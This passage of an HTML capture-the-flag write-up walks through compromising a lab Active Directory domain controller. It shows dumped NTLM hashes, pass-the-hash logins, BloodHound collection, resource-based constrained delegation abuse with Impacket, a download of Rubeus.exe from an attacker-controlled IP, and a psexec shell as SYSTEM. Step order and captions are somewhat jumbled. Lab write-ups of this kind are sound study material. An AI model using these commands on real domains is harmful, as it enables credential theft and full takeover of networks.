+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/resourced]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat hashes.txt | awk -F &#39;:&#39; &#39;{print $1}&#39;
+Administrator
+Guest
+RESOURCEDC$
+krbtgt
+M.Mason
+K.Keen
+L.Livingstone
+J.Johnson
+V.Ventz
+S.Swanson
+P.Parker
+R.Robinson
+D.Durant
+G.Goldberg</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/resourced]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat hashes.txt | awk -F &#39;:&#39; &#39;{print $1}&#39; &gt; users.txt</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/resourced]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat hashes.txt | awk -F &#39;:&#39; &#39;{print $4}&#39;            
+12579b1666d4ac10f0f59f300776495f
+31d6cfe0d16ae931b73c59d7e0c089c0
+9ddb6f4d9d01fedeb4bccfb09df1b39d
+3004b16f88664fbebfcb9ed272b0565b
+3105e0f6af52aba8e11d19f27e487e45
+204410cc5a7147cd52a04ddae6754b0c
+19a3a7550ce8c505c2d46b5e39d6f808
+3e028552b946cc4f282b72879f63b726
+913c144caea1c0a936fd1ccb46929d3c
+bd7c11a9021d2708eda561984f3c8939
+980910b8fc2e4fe9d482123301dd19fe
+fea5a148c14cf51590456b2102b29fac
+08aca8ed17a9eec9fac4acdcb4652c35
+62e16d17c3015c47b4d513e65ca757a2</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/resourced]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat hashes.txt | awk -F &#39;:&#39; &#39;{print $4}&#39; &gt; hash.txt</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ crackmapexec smb 192.168.170.175 -u users.txt -H hash.txt | grep &#39;+&#39;
+SMB                      192.168.170.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>─(kali㉿kali)-[~/offsec/resourced]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ evil-winrm -i 192.168.170.175 -u L.Livingstone -H &quot;19a3a7550ce8c505c2d46b5e39d6f808&quot; 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method \`quoting_detection_proc\&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; whoami
+resourced\l.livingstone
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; .\SharpHound.exe
+2026-06-18T13:14:07.0437080-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2026-06-18T13:14:07.1218350-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-06-18T13:14:07.1374586-07:00|INFORMATION|Initializing SharpHound at 1:14 PM on 6/18/2026
+2026-06-18T13:14:07.2155810-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for resourced.local : ResourceDC.resourced.local
+2026-06-18T13:14:07.3249651-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-06-18T13:14:07.4343372-07:00|INFORMATION|Beginning LDAP search for resourced.local
+2026-06-18T13:14:07.4499632-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2026-06-18T13:14:07.4499632-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2026-06-18T13:14:37.6687131-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 34 MB RAM
+2026-06-18T13:14:50.5437071-07:00|INFORMATION|Consumers finished, closing output channel
+2026-06-18T13:14:50.6687127-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2026-06-18T13:14:50.7312063-07:00|INFORMATION|Status: 101 objects finished (+101 2.348837)/s -- Using 42 MB RAM
+2026-06-18T13:14:50.7312063-07:00|INFORMATION|Enumeration finished in 00:00:43.3123451
+2026-06-18T13:14:50.7937097-07:00|INFORMATION|Saving cache with stats: 59 ID to type mappings.
+ 59 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2026-06-18T13:14:50.8093336-07:00|INFORMATION|SharpHound Enumeration Completed at 1:14 PM on 6/18/2026! Happy Graphing!
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; dir
+
+
+    Directory: C:\Users\L.Livingstone\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/18/2026   1:14 PM          11768 20260618131450_BloodHound.zip
+-a----        6/18/2026   1:14 PM           8964 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
+-a----        6/18/2026   1:13 PM        1046528 SharpHound.exe
+-a----        6/18/2026   1:08 PM        1308348 SharpHound.ps1
+
+
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; download 20*
+                                        
+Info: Downloading C:\Users\L.Livingstone\Documents\20* to Documents
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt;</code></pre><ul>
+<li>we can use <code>Impacket</code> to execute this attack by first create a computer</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name &#39;ATTACK$&#39; -computer-pass &#39;AttackerPC1!&#39;
+
+# Execute the next evidence-gathering step in the authorized lab.
+
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</code></pre><ul>
+<li>next we can verify that this machine was added via our <code>EvilWinRm</code> session</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack
+
+
+DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
+DNSHostName       :
+Enabled           : True
+Name              : ATTACK
+ObjectClass       : computer
+ObjectGUID        : 46145771-06fb-46a1-8b47-714b97be1ed2
+SamAccountName    : ATTACK$
+SID               : S-1-5-21-537427935-490066102-1511301751-4101</code></pre><ul>
+<li>to manage the delegation rights we can use the following script from <a href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">GitHub</a></li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Run the helper or analysis script used in this lab step.
+
+python3 rbcd.py -delegate-to &#39;RESOURCEDC$&#39; -delegate-from &#39;ATTACK$&#39; -action write -dc-ip 192.168.170.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 &#39;resourced.local/l.livingstone&#39;
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+# Execute the next evidence-gathering step in the authorized lab.
+
+[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+# Execute the next evidence-gathering step in the authorized lab.
+
+[*]     ATTACK$      (S-1-5-21-537427935-490066102-1511301751-4101)</code></pre><ul>
+<li>we can verify it worked using the following command on our <code>EvilWinRM</code> session</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
+
+Path Owner                  Access
+---- -----                  ------
+# Execute the next evidence-gathering step in the authorized lab.
+
+     BUILTIN\Administrators resourced\ATTACK$ Allow</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:&#39;AttackerPC1!&#39; -impersonate Administrator -dc-ip 192.168.97.175
+
+[*] Saving ticket in Administrator.ccache</code></pre><ul>
+<li>finally by exporting the ticket and using <code>psexec.py</code> we can get a new shell on the domain as <code>SYSTEM</code> with not password</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>Import-Module ./Powermad.ps1
+Import-Module ./PowerView.ps1
+# Retrieve and inspect the web response from the target.
+
+wget -o Rubeus.exe http://192.168.49.97/Rubeus.exe</code></pre><ul>
+<li>next we need to run the following commands</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+Create Another Computer
+----------------------
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString &#39;Summer2018!&#39; -AsPlainText -Force)
+
+
+Retrive SID
+-----------
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+
+
+Build a Generic ACE with the Attacker-added computer SID
+--------------------------------------------------------
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+
+Set the newly created security descriptor in the msDS
+-----------------------------------------------------
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes}
+
+
+Use Rebeus to hash the plain text password
+------------------------------------------
+Rubeus.exe hash /password:Summer2018!
+
+
+Next we can use &#39;Impacket&#39; to generate our ticket
+-------------------------------------------------
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/attackersystem\$:&#39;Summer2018!&#39; -impersonate Administrator -dc-ip 192.168.97.175
+
+
+Export the Ticket env and add the DC to `/etc/hosts`
+----------------------------------------------------
+export KRB5CCNAME=./Administrator.ccache
+sh -c &#39;echo &quot;192.168.97.175 resourcedc.resourced.local&quot; &gt;&gt; /etc/hosts&#39;
+
+
+Get a `NT/SYSTEM` shell
+-----------------------
+impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.97.175</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># The output confirms the effective user and privilege level of the current session.
+
++]  Getting domain group memberships:                                                                                     
+                                                                                                                           
+Group: &#39;Domain Guests&#39; (RID: 514) has member: resourced\Guest                                                              
+Group: &#39;Group Policy Creator Owners&#39; (RID: 520) has member: resourced\Administrator
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\Administrator
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\krbtgt
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\M.Mason
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\K.Keen
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\L.Livingstone
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\J.Johnson
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\V.Ventz
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\S.Swanson
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\P.Parker
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\R.Robinson
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\D.Durant
+Group: &#39;Domain Users&#39; (RID: 513) has member: resourced\G.Goldberg
+Group: &#39;Schema Admins&#39; (RID: 518) has member: resourced\Administrator
+Group: &#39;Domain Admins&#39; (RID: 512) has member: resourced\Administrator
+Group: &#39;Domain Controllers&#39; (RID: 516) has member: resourced\RESOURCEDC$
+Group: &#39;Enterprise Admins&#39; (RID: 519) has member: resourced\Administrator</code></pre><ul>
+<li>Using <code>enum4linux</code> we found a user and a reminder</li>
+<li><code>index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!</code></li>
+<li>The reminder might be password, trying that</li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+È Look for objects where you have GenericAll/GenericWrite/attribute rights for ACL abuse (password reset, SPN/UAC/RBCD, sidHistory, delegation, DCSync). https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html#acl-abuse                                                                                                                    
+  [+] Found 65 object(s) where your principal has abuse-friendly rights:
+    -&gt; Access Control Assistance Operators (group)
+       DN: CN=Access Control Assistance Operators,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Account Operators (group)
+       DN: CN=Account Operators,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Administrator (user)
+       DN: CN=Administrator,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Administrators (group)
+       DN: CN=Administrators,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; AdminSDHolder (container)
+       DN: CN=AdminSDHolder,CN=System,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Allowed RODC Password Replication Group (group)
+       DN: CN=Allowed RODC Password Replication Group,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Backup Operators (group)
+       DN: CN=Backup Operators,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Cert Publishers (group)
+       DN: CN=Cert Publishers,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Certificate Service DCOM Access (group)
+       DN: CN=Certificate Service DCOM Access,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Cloneable Domain Controllers (group)
+       DN: CN=Cloneable Domain Controllers,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Cryptographic Operators (group)
+       DN: CN=Cryptographic Operators,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; D.Durant (user)
+       DN: CN=D.Durant,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Denied RODC Password Replication Group (group)
+       DN: CN=Denied RODC Password Replication Group,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Distributed COM Users (group)
+       DN: CN=Distributed COM Users,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; DnsAdmins (group)
+       DN: CN=DnsAdmins,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; DnsUpdateProxy (group)
+       DN: CN=DnsUpdateProxy,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Admins (group)
+       DN: CN=Domain Admins,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Computers (group)
+       DN: CN=Domain Computers,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Controllers group (group)
+       DN: CN=Domain Controllers,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Controllers OU (organizationalUnit)
+       DN: OU=Domain Controllers,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Guests (group)
+       DN: CN=Domain Guests,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Root (domainDNS)
+       DN: DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Domain Users (group)
+       DN: CN=Domain Users,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Enterprise Admins (group)
+       DN: CN=Enterprise Admins,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Enterprise Key Admins (group)
+       DN: CN=Enterprise Key Admins,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Enterprise Read-only Domain Controllers (group)
+       DN: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Event Log Readers (group)
+       DN: CN=Event Log Readers,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; G.Goldberg (user)
+       DN: CN=G.Goldberg,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Group Policy Creator Owners (group)
+       DN: CN=Group Policy Creator Owners,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Guest (user)
+       DN: CN=Guest,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Guests (group)
+       DN: CN=Guests,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Hyper-V Administrators (group)
+       DN: CN=Hyper-V Administrators,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; IIS_IUSRS (group)
+       DN: CN=IIS_IUSRS,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Incoming Forest Trust Builders (group)
+       DN: CN=Incoming Forest Trust Builders,CN=Builtin,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; J.Johnson (user)
+       DN: CN=J.Johnson,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; K.Keen (user)
+       DN: CN=K.Keen,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; Key Admins (group)
+       DN: CN=Key Admins,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; krbtgt (user)
+       DN: CN=krbtgt,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; L.Livingstone (user)
+       DN: CN=L.Livingstone,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+    -&gt; M.Mason (user)
+       DN: CN=M.Mason,CN=Users,DC=resourced,DC=local
+       * GenericAll: Full control -&gt; reset password, add group members, edit SPNs/UAC, change ACLs.
+  [!] Additional 25 object(s) not shown (enable domain mode or run winPEAS with more time to enumerate all objects).</code></pre><ul>
+<li>now we can get the <code>administrator</code> service ticket using our privileged machine account</li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code>export KRB5CCNAME=./Administrator.ccache
+sh -c &#39;echo &quot;192.168.97.175 resourcedc.resourced.local&quot; &gt;&gt; /etc/hosts&#39;
+impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.97.175
+
+c) 2018 Microsoft Corporation. All rights reserved.
+
+# Confirm the identity of the current session.
+
+C:\Windows\system32&gt; whoami
+nt authority\system</code></pre><h3>Method #2</h3>
+<ul>
+<li>we can just following the guide on <code>BloodHound</code> and achive same result </li>
+<li>first we need to move <code>Powermad.ps1</code> and <code>PowerView.ps1</code> to the target machine and import them and download <code>Rebues.exe</code></li>
+</ul>
+<h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
